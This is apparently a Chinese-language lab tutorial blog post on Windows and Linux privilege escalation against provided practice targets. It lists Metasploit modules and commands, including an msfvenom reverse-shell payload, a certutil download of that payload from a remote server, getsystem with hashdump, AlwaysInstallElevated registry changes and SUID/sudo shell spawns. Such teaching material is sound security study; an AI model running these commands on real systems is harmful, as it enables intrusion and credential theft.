---
title: "权限提升"
permalink: privilege-escalation/
date: 2026-01-28 01:11:09
categories:
  - 网络安全
  - 内网渗透
tags:
  - 提权
  - Windows
  - Linux
img: /medias/featureimages/20.jpg
summary: "Windows 内核溢出、服务路径、AlwaysInstallElevated 与 Linux SUID、内核漏洞等提权手法。"
---

<!-- more -->

## 简介
## windows 提权限
## 靶场介绍
靶场介绍： 双击 .vmx 即可打开 ，默认用户名 zhangsan ，默认密码 1qaz@WSX （桥接和 NAT均可）

`IP: 192.168.79.133`

## rottenpotato 提权限（ms16-075）
 作用：把windows 的服务账户（如IIS中间件的用户）提升到 system 用户

操作步骤：

### 1 获取webshell

ASP 是 Active Server Pages 的缩写，是微软（Microsoft）开发的一种服务器端脚本技术，用于创建动态网页。它最早在 1996 年推出，主要用于在 IIS（Internet Information Services）服务器上运行

IIS 服务账户，默认有SeAssignPrimaryTokenPrivilege 和 SeImpersonatePrivilege 权限，是进行 rottenpotato 提权的前提条件

### 2  上线 meterpreter

### 3  进行提权
```plain
search ms16-075
use 4
```

## bypass  uac  提权限
+ 前提：已获取的用户权限需要在 administrators 用户组中
+ 作用：处在 administrators 用户组中除 administrator 之外其他用户的提权
+ administrators 用户组，除了 administrator 自己，其他的管理员用户（如zhangsan、lisi）均为 受限制（受到了UAC限制）的管理员
+ UAC：用户账户控制，限制除 administrator 之外其他用户的权限

操作：

### 1  上线普通用户的meterpreter （该用户必须在 administrators 用户组中）
`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.79.129 lport=7586 -f exe -o 123.exe`

`handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.79.129 -P 7586`

`certutil -urlcache -split -f http://云服务器IP:端口/123.exe`

### 2  使用bypass uac 模块提权
`search bypassuac`

```plain
set session 1
set payload windows/x64/meterpreter/reverse_tcp
set lport 9123
show targets
set target 1
```

### 3  getsystem
 bypass uac 上线新的 meterpreter ，用户名依然不变  (run)

+ 如果想从之前的用户名（如zhangsan）切换到 system 用户，需要执行 getsystem
+ 如果想回到之前的用户名 （如zhangsan），需要执行 drop_token

```plain
getuid
getsystem
getuid
hashdump

getprivs
```

 其他bypassuac 方法参考： https://github.com/hfiref0x/UACME

## getsystem 和 drop_token
getsystem： 如果当前用户有 SeImpersonatePrivilege 权限，可以通过命名管道模拟 system 用 户的令牌 （切换到 system 用户）

如果没有 SeImpersonatePrivilege 权限， getsystem 就无法运行

 drop_token: 丢弃 system 用户的令牌，还原为 windows 的真实用户

## 内核漏洞提权
windows 本身内核或服务出现的历史漏洞

###  操作步骤
 `use post/multi/recon/local_exploit_suggester  `

`use exploit/windows/local/ms15_051_client_copy_image`

## 错误的配置提权
### 不安全的服务权限
windows 中可能存在部分服务配置错误，允许普通用户修改、重启服务，攻击者可以直接修改服 务对应可执行文件路径为木马文件路径，服务启动时，运行的就是木马

 windows 系统服务运行权限都是 SYSTEM 用户

 `use exploit/windows/local/service_permissions  `

### 管理员安装MSI
msi 是windows的安装包，有些windows 系统会启用策略 “always_install_elevated” ，意为始终以管理员权限安装msi安装包。 攻击者创建一个 msi 安装包格式的木马，受害者打开安装包，即可完成提权

```plain
reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f

reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v DisableMSI /t REG_DWORD /d 0 /f
```

 提权步骤：

 `use exploit/windows/local/always_install_elevated  `

### 不安全的服务路径（了解）
前提： windows 服务，对应的路径中有空格

靶场中 存在服务 Windows FTP Server ，路径如下，有空格， 实际打开的是 FTPserver.exe 文 件

 `C:\Program Files (x86)\FTP Folder\FTP Services\FTPserver.exe `

```plain
对于这种带空格的路径，windows 打开 FTPserver.exe 时，发生了什么？

尝试执行 C:\Program.exe 把 Files (x86)\FTP Folder\FTP Services\FTPserver.exe 作
为参数，执行失败，继续

尝试执行 C:\Program Files (x86)\FTP.exe 把 Folder\FTP Services\FTPserver.exe 作为
参数，执行失败，继续

尝试执行C:\Program Files (x86)\FTP Folder\FTP.exe ，把 Services\FTPserver.exe 作为
参数，执行失败，继续

尝试执行 C:\Program Files (x86)\FTP Folder\FTP Services\FTPserver.exe ，成功

攻击者如果上传一个木马 C:\Program Files (x86)\FTP Folder\FTP.exe，就会被 windows 执行
```

攻击步骤 （失败率非常高，可以忽略）

 `use exploit/windows/local/unquoted_service_path  `

因为 windows 非管理员用户是默认无法重启服务的，只能重启电脑，在现实中不可能这样干， 可以直接忽略

##  Linux 提权
### 粘滞位
Linux 中，粘滞位（Sticky Bit） 是一种特殊的文件权限位，主要用于目录，其作用是：

即使用户对某个目录具有写权限，也只能删除自己创建的文件，不能删除其他用户的文件

##  靶场介绍
 导入靶场

```plain
docker load -i < linux_elevate.tar
docker run -d -p 2222:22 linux_elevate_hub:latest
```

ssh 登录靶场，默认用户名 zhangsan 密码 123456

##  内核漏洞提权
 linux 本身内核或服务出现的历史漏洞

 1  uname -a 看内核版本号

2  搜索对应的内核版本是否存在漏洞   ( google 搜索 )

https://www.exploit-db.com/ 搜索

linux历史漏洞集合： https://github.com/SecWiki/linux-kernel-exploits

比较出名的历史漏洞： 脏牛漏洞 https://github.com/firefart/dirtycow ，任意地址、任意文件写

##  错误的配置提权
###  suid 提权
 suid 权限：文件运行的权限是文件属主的权限

#### 1  查找所有具有 suid 权限的文件
`find / -perm -u=s -type f 2>/dev/null`

#### 2  到下列网站中搜索是否具有 suid 提权的能力    https://gtfobins.org/

`find . -exec /bin/sh -p \; -quit`

### sudo 提权
#### 1  sudo -l 查看当前用户能够使用sudo 执行哪些命令
```plain
sudo  -l
```

#### 2 到下列网站中搜索是否具有 sudo 提权的能力   https://gtfobins.org/

3  执行 sudo + 命令即可提权

`sudo   bash`
